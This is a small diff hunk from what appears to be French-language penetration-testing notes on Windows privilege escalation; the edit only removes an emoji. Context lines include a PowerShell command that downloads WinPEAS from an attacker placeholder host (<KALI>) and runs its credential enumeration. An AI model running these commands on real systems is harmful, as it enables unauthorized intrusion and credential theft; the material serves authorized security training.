@@ -33,7 +33,7 @@ iwr -uri http://<KALI>/winPEASx64.exe -outfile winpeas.exe
 .\winPEASx64.exe windowscreds
 ```
 
-> 🔴 **Dans la sortie WinPEAS** : focus sur les éléments en rouge/jaune
+>  **Dans la sortie WinPEAS** : focus sur les éléments en rouge/jaune
 > Sections prioritaires : **Privileges, Services, Scheduled Tasks, Credentials**
 
 ---
